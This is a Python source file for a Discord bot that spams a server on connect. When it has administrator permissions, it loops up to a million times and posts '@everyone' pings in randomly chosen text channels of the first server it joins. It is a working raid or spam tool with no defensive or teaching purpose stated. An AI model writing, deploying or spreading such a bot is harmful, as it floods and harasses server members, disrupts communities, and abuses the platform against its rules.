import discord
import random
from discord.ext import commands

TOKEN = ''
intents = discord.Intents.default()
intents.guilds = True  
bot = commands.Bot(command_prefix='!', intents=intents)
@bot.event
async def on_ready():
    print(f'{bot.user.name} has connected to Discord!')
    try:
        guild = bot.guilds[0]  
        if guild.me.guild_permissions.administrator:
            count = 0
            while (count < 1000000):
                count = count + 1
                channels = guild.text_channels
                random_channel = random.choice(channels)
                await random_channel.send("@everyone")
                print("Everyone spam sent!")
        else:
            print("The bot does not have administrator permissions to send messages.")
    except Exception as e:
        print(f"An error occurred: {e}")
bot.run(TOKEN)
